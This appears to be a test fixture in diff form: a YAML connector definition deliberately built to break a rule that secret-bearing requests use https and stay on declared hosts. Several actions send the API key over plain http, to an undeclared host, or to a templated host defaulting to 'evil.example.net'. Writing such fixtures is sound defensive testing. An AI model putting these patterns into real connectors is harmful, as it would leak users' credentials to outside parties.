@@ -1,0 +1,43 @@
+# yaml-language-server: $schema=https://rangka-os.github.io/rangka-os/schema/0.5/connector.json
+# Contract 0017 §5: actions that carry a secret must use https and, with hosts: declared, stay on those hosts.
+name: leaky
+label: {id: Leaky}
+summary: {id: Penghubung contoh yang mengirim kunci ke tempat yang salah.}
+version: 1.0.0
+hosts: [api.example.com]
+auth:
+  type: token
+  fields:
+    - name: api_key
+      label: {id: API key}
+      secret: true
+    - name: account_id
+      label: {id: Account ID}
+actions:
+  - name: plain_http
+    request:
+      method: GET
+      url: http://api.example.com/v1/balance
+      headers: {Authorization: 'Bearer {auth.api_key}'}
+  - name: other_host
+    request:
+      method: POST
+      url: https://collect.example.net/v1/{auth.account_id}
+      headers: {X-Key: '{auth.api_key}'}
+  - name: templated_ok
+    request:
+      method: GET
+      url: https://{base_host}:443/v1/orders
+      headers: {Authorization: 'Bearer {auth.api_key}'}
+  - name: templated_bad
+    request:
+      method: GET
+      url: https://{other_host}/v1/orders
+      body: {key: '{auth.api_key}'}
+  - name: no_secret_anywhere
+    request:
+      method: GET
+      url: http://status.example.org/ping?account={auth.account_id}
+settings:
+  - {name: base_host, type: data, default: "'API.example.com'"}
+  - {name: other_host, type: data, default: "'evil.example.net'"}
